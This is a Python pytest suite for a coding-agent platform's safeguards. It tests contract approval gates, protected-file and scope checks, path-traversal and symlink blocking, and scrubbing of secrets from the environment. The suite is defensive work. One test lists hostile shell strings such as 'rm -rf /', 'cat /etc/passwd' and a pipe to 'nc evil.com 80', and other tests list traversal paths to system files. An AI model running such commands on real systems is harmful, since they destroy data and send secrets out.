import time
import uuid
import pytest
from pathlib import Path
from pydantic import ValidationError
from fastapi.testclient import TestClient

from app.core.config import settings
from app.db.models.task import Task
from app.main import app
from app.schemas.contract import (
    AcceptanceCriterion,
    CommandEvidence,
    ScopeStatus,
    TaskContract,
    TaskContractApprovalRequest,
    TestExecutionStatus,
    VerificationEvidence,
)
from app.schemas.task import TaskStatus, can_transition
from app.services.agent_adapter import simulated_agent
from app.services.contract_service import contract_service
from app.services.verification_runner import verification_runner
from app.services.workspace import get_workspace_provider


@pytest.fixture
def client(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(settings, "AGENT_PROVIDER", "simulated")
    simulated_agent.step_delay = 0.01
    with TestClient(app) as test_client:
        yield test_client
    simulated_agent.step_delay = 0.4


def create_user_and_project(client: TestClient, prefix: str = "contract_user") -> tuple[str, str, str]:
    """Helper to register user, login, and create a project, returning (user_id, token, project_id)."""
    email = f"{prefix}_{int(time.time() * 1000)}_{uuid.uuid4().hex[:6]}@example.com"
    password = "SecurePassword123!"

    reg_res = client.post(
        f"{settings.API_V1_STR}/auth/register",
        json={"email": email, "password": password, "full_name": f"{prefix} tester"},
    )
    assert reg_res.status_code == 201, reg_res.text
    user_id = reg_res.json()["user"]["id"]

    login_res = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"email": email, "password": password},
    )
    assert login_res.status_code == 200, login_res.text
    token = login_res.json()["access_token"]

    headers = {"Authorization": f"Bearer {token}"}
    proj_res = client.post(
        f"{settings.API_V1_STR}/projects",
        json={
            "name": f"{prefix} Project",
            "source_type": "scratch",
            "default_branch": "main",
        },
        headers=headers,
    )
    assert proj_res.status_code == 201, proj_res.text
    project_id = proj_res.json()["id"]

    return user_id, token, project_id


# ==============================================================================
# 1. Contract Schema Validation Tests
# ==============================================================================

def test_acceptance_criterion_schema_validation():
    """Verify criterion IDs are validated and invalid characters are rejected."""
    crit = AcceptanceCriterion(id="crit_1", description="Implement divide function")
    assert crit.id == "crit_1"
    assert crit.verified is False

    with pytest.raises(ValidationError):
        AcceptanceCriterion(id="crit with spaces", description="Valid description")

    with pytest.raises(ValidationError):
        AcceptanceCriterion(id="crit@!#", description="Valid description")


def test_command_evidence_injection_prevention():
    """Verify CommandEvidence rejects dangerous shell chaining operators."""
    valid_ev = CommandEvidence(
        command="python -m unittest test_calc.py",
        exit_code=0,
        duration_ms=45,
        stdout_snippet="OK",
        status=TestExecutionStatus.PASSED,
    )
    assert valid_ev.exit_code == 0
    assert valid_ev.status == TestExecutionStatus.PASSED

    for bad_cmd in [
        "pytest; rm -rf /",
        "pytest && cat /etc/passwd",
        "pytest || touch hacked.txt",
        "pytest | nc evil.com 80",
        "`cat /secret`",
        "echo $(whoami)",
    ]:
        with pytest.raises(ValidationError):
            CommandEvidence(
                command=bad_cmd,
                exit_code=1,
                duration_ms=10,
                status=TestExecutionStatus.FAILED,
            )


def test_task_contract_path_traversal_rejection():
    """Verify TaskContract rejects path traversal and absolute paths."""
    tid = uuid.uuid4()
    valid_contract = TaskContract(
        task_id=tid,
        summary="Add multiplication function",
        criteria=[AcceptanceCriterion(id="crit_1", description="Multiply two numbers")],
        allowed_files=["src/math.py", "tests/test_math.py"],
        protected_files=["auth.py", ".env"],
        test_commands=["python -m unittest"],
    )
    assert valid_contract.allowed_files == ["src/math.py", "tests/test_math.py"]
    h = valid_contract.compute_hash()
    assert len(h) == 64  # SHA-256 hex digest

    # Path traversal in allowed_files
    with pytest.raises(ValidationError):
        TaskContract(
            task_id=tid,
            summary="Bad paths",
            criteria=[AcceptanceCriterion(id="c1", description="test")],
            allowed_files=["../../etc/passwd"],
        )

    # Absolute path in allowed_files
    with pytest.raises(ValidationError):
        TaskContract(
            task_id=tid,
            summary="Bad paths",
            criteria=[AcceptanceCriterion(id="c1", description="test")],
            allowed_files=["/root/evil.py"],
        )


# ==============================================================================
# 2. Contract Generation & Self-Approval Prevention Tests
# ==============================================================================

@pytest.mark.asyncio
async def test_contract_generation_untrusted_model_data():
    """Verify backend forces is_approved_by_user=False on proposed contracts."""
    tid = uuid.uuid4()
    mock_task = Task(
        id=tid,
        title="Implement Calculator Divide",
        prompt="Add a divide function to calculator.py and handle division by zero.",
        status=TaskStatus.QUEUED.value,
        require_contract=True,
    )

    contract = await contract_service.generate_contract_proposal(
        mock_task, ["calculator.py", "test_calculator.py", "auth.py"]
    )

    # Security check: Model proposal MUST NOT be pre-approved
    assert contract.is_approved_by_user is False
    assert contract.approved_by_user_id is None
    assert contract.approved_at is None
    assert contract.contract_hash is not None
    assert len(contract.criteria) >= 2
    assert "calculator.py" in contract.allowed_files
    assert "auth.py" in contract.protected_files


# ==============================================================================
# 3. Backend Write-Tool Permission & Security Boundary Tests
# ==============================================================================

def test_verify_write_permission_unapproved_contract_blocked():
    """Verify write operations are blocked before Gate 1 contract approval."""
    tid = uuid.uuid4()
    contract = TaskContract(
        task_id=tid,
        summary="Add feature",
        criteria=[AcceptanceCriterion(id="c1", description="test")],
        allowed_files=["app/main.py"],
        protected_files=["auth.py", ".env"],
        is_approved_by_user=False,  # Unapproved
    )

    mock_task = Task(
        id=tid,
        title="Add feature",
        status=TaskStatus.CONTRACT_PROPOSED.value,
        require_contract=True,
        contract_data=contract.model_dump(mode="json"),
    )

    allowed, err_msg, err_code = contract_service.verify_write_permission(mock_task, "app/main.py")
    assert allowed is False
    assert err_code == "CONTRACT_NOT_APPROVED"


def test_verify_write_permission_protected_file_blocked():
    """Verify writes targeting protected files (auth.py, .env) are blocked even if contract is approved."""
    tid = uuid.uuid4()
    uid = uuid.uuid4()
    contract = TaskContract(
        task_id=tid,
        summary="Add feature",
        criteria=[AcceptanceCriterion(id="c1", description="test")],
        allowed_files=["app/main.py", "auth.py"],  # Even if mistakenly listed in allowed_files
        protected_files=["auth.py", ".env"],
        is_approved_by_user=True,
        approved_by_user_id=uid,
    )

    mock_task = Task(
        id=tid,
        title="Add feature",
        status=TaskStatus.RUNNING.value,
        require_contract=True,
        contract_data=contract.model_dump(mode="json"),
    )

    for protected_target in [
        "auth.py",
        "app/auth.py",
        ".env",
        "backend/.env",
        "AUTH.PY",
        "App\\Auth.Py",
        "./auth.py",
        "./.env",
    ]:
        allowed, err_msg, err_code = contract_service.verify_write_permission(mock_task, protected_target)
        assert allowed is False, f"Expected {protected_target} to be blocked"
        assert err_code == "PROTECTED_FILE_VIOLATION"


def test_verify_write_permission_permitted_new_files_allowed():
    """Verify that permitted new files are allowed when allow_new_files=True and not protected."""
    tid = uuid.uuid4()
    uid = uuid.uuid4()
    contract = TaskContract(
        task_id=tid,
        summary="Add new helper",
        criteria=[AcceptanceCriterion(id="c1", description="test")],
        allowed_files=["calculator.py"],
        allow_new_files=True,  # New files permitted
        protected_files=["auth.py", ".env"],
        is_approved_by_user=True,
        approved_by_user_id=uid,
    )

    mock_task = Task(
        id=tid,
        title="Add new helper",
        status=TaskStatus.RUNNING.value,
        require_contract=True,
        contract_data=contract.model_dump(mode="json"),
    )

    # Legitimate new file
    allowed, err_msg, err_code = contract_service.verify_write_permission(mock_task, "calculator_helper.py")
    assert allowed is True
    assert err_msg is None

    # Legitimate test file in subdirectory
    allowed, err_msg, err_code = contract_service.verify_write_permission(mock_task, "tests/test_calculator_div.py")
    assert allowed is True
    assert err_msg is None


def test_verify_write_permission_scope_violation_blocked():
    """Verify writes outside allowed scope are blocked when allow_new_files=False."""
    tid = uuid.uuid4()
    uid = uuid.uuid4()
    contract = TaskContract(
        task_id=tid,
        summary="Strict refactor",
        criteria=[AcceptanceCriterion(id="c1", description="test")],
        allowed_files=["app/calculator.py"],
        allow_new_files=False,
        is_approved_by_user=True,
        approved_by_user_id=uid,
    )

    mock_task = Task(
        id=tid,
        title="Strict refactor",
        status=TaskStatus.RUNNING.value,
        require_contract=True,
        contract_data=contract.model_dump(mode="json"),
    )

    allowed, err_msg, err_code = contract_service.verify_write_permission(mock_task, "app/rogue.py")
    assert allowed is False
    assert err_code == "SCOPE_VIOLATION"


def test_verify_write_permission_path_traversal_and_symlink_blocked(tmp_path: Path):
    """Verify path traversal (..) and symlink escapes are blocked."""
    tid = uuid.uuid4()
    mock_task = Task(id=tid, title="Test", status=TaskStatus.RUNNING.value, require_contract=False)

    # Path traversal strings
    for bad_path in ["../secret.py", "app/../../secret.py", "/etc/passwd", "C:\\Windows\\System32"]:
        allowed, err_msg, err_code = contract_service.verify_write_permission(mock_task, bad_path)
        assert allowed is False
        assert err_code == "PATH_TRAVERSAL_DETECTED"

    # Symlink escape outside workspace boundary
    workspace_root = tmp_path / "workspace"
    workspace_root.mkdir()
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()

    # Create a symlink inside workspace pointing outside
    try:
        escape_symlink = workspace_root / "leak_link"
        escape_symlink.symlink_to(outside_dir, target_is_directory=True)

        allowed, err_msg, err_code = contract_service.verify_write_permission(
            mock_task, "leak_link/secret.txt", workspace_root=workspace_root
        )
        assert allowed is False
        assert err_code == "SYMLINK_ESCAPE_DETECTED"
    except (OSError, NotImplementedError):
        # On Windows unprivileged developer mode might skip symlink creation
        pass


# ==============================================================================
# 4. API Endpoints, Ownership & Stale Approval Rejection Tests
# ==============================================================================

def test_contract_proposal_and_approval_api_flow(client: TestClient):
    """Verify contract generation, retrieval, and approval via HTTP API."""
    user_id, token, proj_id = create_user_and_project(client, "contract_owner")
    headers = {"Authorization": f"Bearer {token}"}

    # 1. Create task requiring contract
    create_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks",
        json={
            "title": "Add Division with Zero Handling",
            "prompt": "Create divide(a, b) in calculator.py, throw ValueError for zero.",
            "require_contract": True,
        },
        headers=headers,
    )
    assert create_res.status_code == 201
    task_data = create_res.json()
    task_id = task_data["id"]
    assert task_data["require_contract"] is True

    # 2. Generate contract proposal
    gen_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/contract/generate",
        headers=headers,
    )
    assert gen_res.status_code == 200
    contract_data = gen_res.json()
    assert contract_data["task_id"] == task_id
    assert contract_data["is_approved_by_user"] is False
    contract_hash = contract_data["contract_hash"]

    # 3. Retrieve contract
    get_res = client.get(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/contract",
        headers=headers,
    )
    assert get_res.status_code == 200
    assert get_res.json()["summary"] == contract_data["summary"]

    # 4. Another user cannot approve Owner's contract (Ownership Isolation)
    _, rogue_token, _ = create_user_and_project(client, "rogue_user")
    rogue_headers = {"Authorization": f"Bearer {rogue_token}"}
    rogue_approve_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/contract/approve",
        json={"action": "approve", "contract_hash": contract_hash},
        headers=rogue_headers,
    )
    assert rogue_approve_res.status_code in (404, 403)

    # 5. Stale approval rejection: mismatching contract hash is rejected
    stale_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/contract/approve",
        json={"action": "approve", "contract_hash": "stale_hash_1234567890abcdef"},
        headers=headers,
    )
    assert stale_res.status_code == 409
    assert "Stale approval rejected" in stale_res.json()["detail"]

    # 6. Valid approval by authorized owner
    approve_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/contract/approve",
        json={"action": "approve", "contract_hash": contract_hash},
        headers=headers,
    )
    assert approve_res.status_code == 200
    assert approve_res.json()["approved"] is True

    # 7. Verify task status progressed to CONTRACT_APPROVED
    task_res = client.get(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}",
        headers=headers,
    )
    assert task_res.status_code == 200
    assert task_res.json()["status"] in (
        TaskStatus.CONTRACT_APPROVED.value,
        TaskStatus.RUNNING.value,
        TaskStatus.APPROVAL_REQUIRED.value,
        TaskStatus.COMPLETED.value,
    )


def test_contract_rejection_cancels_task(client: TestClient):
    """Verify rejecting a contract transitions task to CANCELLED cleanly."""
    user_id, token, proj_id = create_user_and_project(client, "reject_owner")
    headers = {"Authorization": f"Bearer {token}"}

    create_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks",
        json={
            "title": "Unwanted refactor",
            "prompt": "Rewrite all modules from scratch",
            "require_contract": True,
        },
        headers=headers,
    )
    task_id = create_res.json()["id"]

    # Generate contract
    client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/contract/generate",
        headers=headers,
    )

    # Explicit user rejection
    reject_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/contract/approve",
        json={"action": "reject", "reason": "Too broad scope; rejected by developer."},
        headers=headers,
    )
    assert reject_res.status_code == 200
    assert reject_res.json()["approved"] is False

    task_res = client.get(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}",
        headers=headers,
    )
    assert task_res.status_code == 200
    assert task_res.json()["status"] == TaskStatus.CANCELLED.value


# ==============================================================================
# 5. Existing Task Lifecycle Compatibility
# ==============================================================================

def test_existing_lifecycle_backward_compatibility(client: TestClient):
    """Verify tasks without require_contract proceed through standard lifecycle."""
    user_id, token, proj_id = create_user_and_project(client, "legacy_owner")
    headers = {"Authorization": f"Bearer {token}"}

    res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks",
        json={
            "title": "Legacy task",
            "prompt": "Fix typo in comment",
            "require_contract": False,
        },
        headers=headers,
    )
    assert res.status_code == 201
    task_id = res.json()["id"]

    # Verify transitions
    assert can_transition(TaskStatus.QUEUED, TaskStatus.RUNNING)
    assert can_transition(TaskStatus.QUEUED, TaskStatus.CONTRACT_PROPOSED)
    assert can_transition(TaskStatus.CONTRACT_PROPOSED, TaskStatus.CONTRACT_APPROVED)
    assert can_transition(TaskStatus.CONTRACT_APPROVED, TaskStatus.RUNNING)


# ==============================================================================
# 6. Verification Runner and Deterministic Probes Tests (Day 2)
# ==============================================================================

def test_verification_endpoint_lifecycle(client: TestClient):
    """Verify GET verification endpoint returns 404 when pending and 200 once verified."""
    user_id, token, proj_id = create_user_and_project(client, "verify_owner")
    headers = {"Authorization": f"Bearer {token}"}

    create_res = client.post(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks",
        json={
            "title": "Calculator divide",
            "prompt": "Implement calculator divide with zero handling",
            "require_contract": True,
        },
        headers=headers,
    )
    assert create_res.status_code == 201
    task_id = create_res.json()["id"]

    # 1. Before verification, endpoint returns 404
    v_res = client.get(
        f"{settings.API_V1_STR}/projects/{proj_id}/tasks/{task_id}/verification",
        headers=headers,
    )
    assert v_res.status_code == 404
    assert "not been executed" in v_res.json()["detail"]


@pytest.mark.asyncio
async def test_verification_runner_allowlist_and_safety(tmp_path: Path):
    """Verify allowlist enforcement blocks unapproved binaries and dangerous chaining."""
    from app.db.models.workspace import Workspace

    ws_root = tmp_path / "test_ws"
    ws_root.mkdir()
    ws = Workspace(
        id=uuid.uuid4(),
        user_id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        name="test_ws",
        root_path=str(ws_root),
        host_type="local",
        status="RUNNING",
    )

    contract = TaskContract(
        task_id=uuid.uuid4(),
        summary="Test task",
        criteria=[AcceptanceCriterion(id="crit_1", description="Valid test")],
        allowed_files=["test.py"],
        allow_new_files=True,
        protected_files=["auth.py"],
        test_commands=[
            "python -c \"print('PASS')\"",
            "git status",  # Disallowed binary stem
        ],
    )

    task = Task(
        id=contract.task_id,
        project_id=ws.project_id,
        title="Test",
        prompt="Test",
        status=TaskStatus.RUNNING.value,
        contract_data=contract.model_dump(mode="json"),
    )

    evidence = await verification_runner.run_verification(
        task=task,
        workspace=ws,
        task_owned_files={"test.py"},
    )

    assert evidence.scope_status == ScopeStatus.CLEAN
    assert len(evidence.command_runs) == 2

    # python -c PASS executed
    assert evidence.command_runs[0].status == TestExecutionStatus.PASSED
    assert evidence.command_runs[0].exit_code == 0

    # git was blocked by allowlist
    assert evidence.command_runs[1].status == TestExecutionStatus.BLOCKED
    assert "allowlist" in (evidence.command_runs[1].stderr_snippet or "")

    # Overall verdict should reflect failed/blocked checks
    assert evidence.overall_verdict == "FAILED_CHECKS"
    assert evidence.all_criteria_met is False


@pytest.mark.asyncio
async def test_verification_runner_scope_breach_detection(tmp_path: Path):
    """Verify modifying a protected file marks verdict SCOPE_BREACH."""
    from app.db.models.workspace import Workspace

    ws_root = tmp_path / "test_ws_scope"
    ws_root.mkdir()
    ws = Workspace(
        id=uuid.uuid4(),
        user_id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        name="test_ws_scope",
        root_path=str(ws_root),
        host_type="local",
        status="READY",
    )

    contract = TaskContract(
        task_id=uuid.uuid4(),
        summary="Calculator task",
        criteria=[AcceptanceCriterion(id="crit_1", description="Implement divide")],
        allowed_files=["calculator.py"],
        allow_new_files=True,
        protected_files=["auth.py", ".env", "config.py"],
        test_commands=["python -c 'print(\"OK\")'"],
    )

    task = Task(
        id=contract.task_id,
        project_id=ws.project_id,
        title="Calculator",
        prompt="Implement calculator",
        status=TaskStatus.RUNNING.value,
        contract_data=contract.model_dump(mode="json"),
    )

    # Task modified a protected file
    evidence = await verification_runner.run_verification(
        task=task,
        workspace=ws,
        task_owned_files={"calculator.py", "auth.py"},
    )

    assert evidence.scope_status == ScopeStatus.VIOLATED
    assert "auth.py" in evidence.protected_files_violated
    assert evidence.overall_verdict == "SCOPE_BREACH"
    assert evidence.all_criteria_met is False


@pytest.mark.asyncio
async def test_verification_runner_calculator_deterministic_probes(tmp_path: Path):
    """Verify deterministic calculator edge-case probes (zero division & addition regression)."""
    from app.db.models.workspace import Workspace

    ws_root = tmp_path / "test_ws_calc"
    ws_root.mkdir()
    ws = Workspace(
        id=uuid.uuid4(),
        user_id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        name="test_ws_calc",
        root_path=str(ws_root),
        host_type="local",
        status="RUNNING",
    )

    # Write proper calculator.py
    calc_code = (
        "def add(a, b):\n"
        "    return a + b\n\n"
        "def divide(a, b):\n"
        "    if b == 0:\n"
        "        raise ValueError('Cannot divide by zero')\n"
        "    return a / b\n"
    )
    (ws_root / "calculator.py").write_text(calc_code, encoding="utf-8")

    # Write test_calc.py
    test_code = (
        "import unittest\n"
        "import calculator\n\n"
        "class TestCalculator(unittest.TestCase):\n"
        "    def test_divide_valid(self):\n"
        "        self.assertEqual(calculator.divide(10, 2), 5.0)\n\n"
        "if __name__ == '__main__':\n"
        "    unittest.main()\n"
    )
    (ws_root / "test_calc.py").write_text(test_code, encoding="utf-8")

    contract = TaskContract(
        task_id=uuid.uuid4(),
        summary="Implement safe calculator",
        criteria=[
            AcceptanceCriterion(id="crit_1", description="Division by zero raises ValueError"),
            AcceptanceCriterion(id="crit_2", description="Addition arithmetic behaves normally without regression"),
        ],
        allowed_files=["calculator.py", "test_calc.py"],
        test_commands=["python -m unittest test_calc.py"],
    )

    task = Task(
        id=contract.task_id,
        project_id=ws.project_id,
        title="Safe Calculator",
        prompt="Implement safe calculator",
        status=TaskStatus.RUNNING.value,
        contract_data=contract.model_dump(mode="json"),
    )

    evidence = await verification_runner.run_verification(
        task=task,
        workspace=ws,
        task_owned_files={"calculator.py"},
    )

    assert evidence.scope_status == ScopeStatus.CLEAN
    assert len(evidence.break_it_checks) == 2

    # Check zero division probe
    zero_probe = next(bc for bc in evidence.break_it_checks if "Zero Division" in bc.name)
    assert zero_probe.passed is True
    assert "Raised ValueError" in zero_probe.actual_behavior

    # Check addition regression probe
    add_probe = next(bc for bc in evidence.break_it_checks if "Regression" in bc.name)
    assert add_probe.passed is True
    assert "returned 5" in add_probe.actual_behavior

    # Check criteria verified flags updated
    updated_contract = TaskContract.model_validate(task.contract_data)
    assert updated_contract.criteria[0].verified is True
    assert updated_contract.criteria[1].verified is True
    assert evidence.all_criteria_met is True
    assert evidence.overall_verdict == "PROVEN"


def test_end_to_end_contract_gate1_approval_lifecycle(client: TestClient):
    """End-to-End audit: Task requires contract -> Gate 1 blocks writes -> phone approves -> writes allowed."""
    _, token, project_id = create_user_and_project(client, "gate1_e2e")
    headers = {"Authorization": f"Bearer {token}"}

    # 1. Create task requiring contract
    create_res = client.post(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks",
        headers=headers,
        json={
            "title": "Calculator Division Feature",
            "prompt": "Implement calculator divide with ValueError on zero",
            "require_contract": True,
        },
    )
    assert create_res.status_code == 201, create_res.text
    task_data = create_res.json()
    task_id = task_data["id"]
    assert task_data["require_contract"] is True

    # 2. Allow simulated agent to propose contract and fetch contract
    time.sleep(0.05)
    c_res = client.get(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/contract",
        headers=headers,
    )
    if c_res.status_code != 200:
        # If not auto-proposed yet, trigger generation
        gen_res = client.post(
            f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/contract/generate",
            headers=headers,
        )
        assert gen_res.status_code == 200, gen_res.text
        contract_data = gen_res.json()
    else:
        contract_data = c_res.json()

    contract_hash = contract_data["contract_hash"]
    assert len(contract_hash) == 64

    # 3. Gate 1 Enforcement: Model write tool execution is blocked before approval
    unapproved_task = Task(
        id=uuid.UUID(task_id),
        require_contract=True,
        contract_data=contract_data,
    )
    allowed, err_msg, err_code = contract_service.verify_write_permission(
        task=unapproved_task,
        target_path="calculator.py",
    )
    assert allowed is False
    assert err_code == "CONTRACT_NOT_APPROVED"

    # 4. Tamper & Stale Defense: Approve with altered hash fails with 409
    bad_approve_res = client.post(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/contract/approve",
        headers=headers,
        json={
            "action": "approve",
            "contract_hash": "0" * 64,
            "reason": "Tampered hash approval attempt",
        },
    )
    assert bad_approve_res.status_code == 409
    assert "Stale approval rejected" in bad_approve_res.json()["detail"]

    # 5. Legitimate Phone Approval (Gate 1 Passed)
    approve_res = client.post(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/contract/approve",
        headers=headers,
        json={
            "action": "approve",
            "contract_hash": contract_hash,
            "reason": "Approved via mobile Gate 1 card",
        },
    )
    assert approve_res.status_code == 200, approve_res.text
    approved_payload = approve_res.json()
    assert approved_payload["approved"] is True
    assert approved_payload["approved_at"] is not None

    # 6. Gate 1 Passed: Writes to allowed file now succeed
    c_approved = client.get(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/contract",
        headers=headers,
    ).json()
    assert c_approved["is_approved_by_user"] is True

    approved_task = Task(
        id=uuid.UUID(task_id),
        require_contract=True,
        contract_data=c_approved,
    )
    allowed, err_msg, err_code = contract_service.verify_write_permission(
        task=approved_task,
        target_path="calculator.py",
    )
    assert allowed is True
    assert err_msg is None


def test_workspace_environment_sanitization_audit():
    """Verify LocalSandboxWorkspaceProvider completely scrubs credentials, secrets, and API keys."""
    import os
    from app.services.workspace.local_sandbox import LocalSandboxWorkspaceProvider

    # Inject mock sensitive host environment variables
    os.environ["DATABASE_URL"] = "postgresql://superuser:secretpassword@prod-db.internal/museflow"
    os.environ["MODEL_API_KEY"] = "sk-ant-api03-ultra-secret-key-do-not-leak"
    os.environ["GITHUB_TOKEN"] = "ghp_super_secret_github_personal_token"
    os.environ["SECRET_KEY"] = "very-confidential-secret"

    try:
        provider = LocalSandboxWorkspaceProvider()
        clean_env = provider._get_clean_env()

        # Sensitive variables MUST NOT exist in clean_env
        assert "DATABASE_URL" not in clean_env
        assert "MODEL_API_KEY" not in clean_env
        assert "GITHUB_TOKEN" not in clean_env
        assert "SECRET_KEY" not in clean_env

        # Safe system variables remain intact
        assert "PATH" in clean_env
        assert clean_env.get("LANG") == "C.UTF-8"
        assert clean_env.get("LC_ALL") == "C.UTF-8"
    finally:
        os.environ.pop("DATABASE_URL", None)
        os.environ.pop("MODEL_API_KEY", None)
        os.environ.pop("GITHUB_TOKEN", None)
        os.environ.pop("SECRET_KEY", None)


def test_symlink_escape_and_workspace_containment(tmp_path: Path):
    """Verify resolve_secure_path detects and stops path traversal, escaping, and illegal paths."""
    from app.services.workspace.base import resolve_secure_path

    ws_root = tmp_path / "sandbox_containment"
    ws_root.mkdir()

    # Normal clean paths resolve safely inside root
    safe_path = resolve_secure_path(ws_root, "src/components/button.py")
    assert safe_path == (ws_root / "src/components/button.py").resolve()

    # Traversal attempts outside workspace MUST raise ValueError
    with pytest.raises(ValueError, match="Path traversal attempt detected"):
        resolve_secure_path(ws_root, "../../outside_file.txt")

    with pytest.raises(ValueError, match="Path traversal attempt detected"):
        resolve_secure_path(ws_root, "subdir/../../../etc/passwd")

    # Absolute paths prohibited
    with pytest.raises(ValueError, match="Absolute paths are prohibited"):
        resolve_secure_path(ws_root, "/etc/shadow")


@pytest.mark.asyncio
async def test_safe_task_revert_preserves_preexisting_user_work(tmp_path: Path):
    """Verify _revert_task_changes deletes agent-created files while leaving pre-existing user files intact."""
    from app.db.models.workspace import Workspace
    from app.services.meta_agent import _revert_task_changes
    from app.services.workspace.local_sandbox import LocalSandboxWorkspaceProvider

    ws_root = tmp_path / "safe_revert_ws"
    ws_root.mkdir()

    # 1. Pre-existing user files (one modified in progress, one untracked notes file)
    user_file = ws_root / "existing_user_code.py"
    user_file.write_text("# Pre-existing user work\n", encoding="utf-8")

    user_notes = ws_root / "my_notes.txt"
    user_notes.write_text("Don't delete my notes\n", encoding="utf-8")

    # 2. Agent creates a new file during the task
    agent_file = ws_root / "agent_created.py"
    agent_file.write_text("# Agent newly generated code\n", encoding="utf-8")

    ws = Workspace(
        id=uuid.uuid4(),
        user_id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        name="safe_revert_ws",
        root_path=str(ws_root),
        host_type="local",
        status="RUNNING",
    )

    provider = LocalSandboxWorkspaceProvider()

    # Baseline recorded before agent task execution
    baseline = {
        "branch": "main",
        "sha": "abc1234",
        "modified": {"existing_user_code.py"},
        "untracked": {"my_notes.txt"},
    }
    file_existed_before_task = {
        "existing_user_code.py": True,
        "my_notes.txt": True,
        "agent_created.py": False,
    }
    task_owned_files = {"agent_created.py", "existing_user_code.py"}

    # Revert task changes (e.g. on rejection)
    await _revert_task_changes(
        ws_provider=provider,
        workspace=ws,
        task_owned_files=task_owned_files,
        baseline=baseline,
        file_existed_before_task=file_existed_before_task,
    )

    # Agent file was new -> MUST be unlinked/deleted
    assert not agent_file.exists(), "Agent created file must be deleted upon task reversion"

    # Pre-existing user file was in baseline modified -> MUST NOT be deleted or cleared
    assert user_file.exists(), "Pre-existing modified user file must be preserved"
    assert user_file.read_text(encoding="utf-8") == "# Pre-existing user work\n"

    # User untracked file was not task-owned -> MUST NOT be touched
    assert user_notes.exists(), "Pre-existing untracked user file must be preserved"
    assert user_notes.read_text(encoding="utf-8") == "Don't delete my notes\n"


def test_gate2_commit_blocked_when_verification_failed(client: TestClient):
    """Gate 2 Enforcement: Committing a task with failing tests or scope breach is strictly blocked."""
    _, token, project_id = create_user_and_project(client, "gate2_block")
    headers = {"Authorization": f"Bearer {token}"}

    from app.db.session import async_session_factory
    from app.db.models.task import Task
    import asyncio

    task_id = uuid.uuid4()

    async def _setup_task():
        async with async_session_factory() as db:
            db_task = Task(
                id=task_id,
                project_id=uuid.UUID(project_id),
                title="Calculator Feature",
                prompt="Implement divide",
                status=TaskStatus.APPROVAL_REQUIRED.value,
                require_contract=True,
                contract_data={
                    "task_id": str(task_id),
                    "summary": "Calculator contract",
                    "criteria": [{"id": "crit_1", "description": "divide returns quotient", "verified": False}],
                    "allowed_files": ["calculator.py"],
                    "is_approved_by_user": True,
                },
                verification_data={
                    "task_id": str(task_id),
                    "scope_status": "CLEAN",
                    "overall_verdict": "FAILED_CHECKS",
                    "all_criteria_met": False,
                    "command_runs": [],
                    "break_it_checks": [],
                },
            )
            db.add(db_task)
            await db.commit()

    asyncio.run(_setup_task())

    # 1. Attempting to approve commit when verification is FAILED_CHECKS MUST fail with 400
    bad_approve_res = client.post(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/approve",
        headers=headers,
        json={"action": "approve"},
    )
    assert bad_approve_res.status_code == 400
    assert "Gate 2 Commit Blocked" in bad_approve_res.json()["detail"]
    assert "FAILED_CHECKS" in bad_approve_res.json()["detail"]

    # 2. Scope breach also blocks commit
    async def _set_scope_breach():
        async with async_session_factory() as db:
            t = await db.get(Task, task_id)
            t.verification_data = {
                "task_id": str(task_id),
                "scope_status": "VIOLATED",
                "overall_verdict": "SCOPE_BREACH",
                "all_criteria_met": False,
                "protected_files_violated": [".env"],
                "command_runs": [],
                "break_it_checks": [],
            }
            await db.commit()

    asyncio.run(_set_scope_breach())

    breach_approve_res = client.post(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/approve",
        headers=headers,
        json={"action": "approve"},
    )
    assert breach_approve_res.status_code == 400
    assert "Gate 2 Commit Blocked" in breach_approve_res.json()["detail"]
    assert "SCOPE_BREACH" in breach_approve_res.json()["detail"]

    # 3. Rejecting changes is permitted and cancels task
    reject_res = client.post(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/approve",
        headers=headers,
        json={"action": "reject", "reason": "Verification failed. Reverting agent changes."},
    )
    assert reject_res.status_code == 200
    assert reject_res.json()["approved"] is False


def test_gate2_commit_allowed_when_verification_proven(client: TestClient):
    """Gate 2 Approval: Committing a verified task (PROVEN) succeeds."""
    _, token, project_id = create_user_and_project(client, "gate2_success")
    headers = {"Authorization": f"Bearer {token}"}

    from app.db.session import async_session_factory
    from app.db.models.task import Task
    import asyncio

    task_id = uuid.uuid4()

    async def _setup_proven_task():
        async with async_session_factory() as db:
            db_task = Task(
                id=task_id,
                project_id=uuid.UUID(project_id),
                title="Calculator Feature",
                prompt="Implement divide",
                status=TaskStatus.APPROVAL_REQUIRED.value,
                require_contract=True,
                contract_data={
                    "task_id": str(task_id),
                    "summary": "Calculator contract",
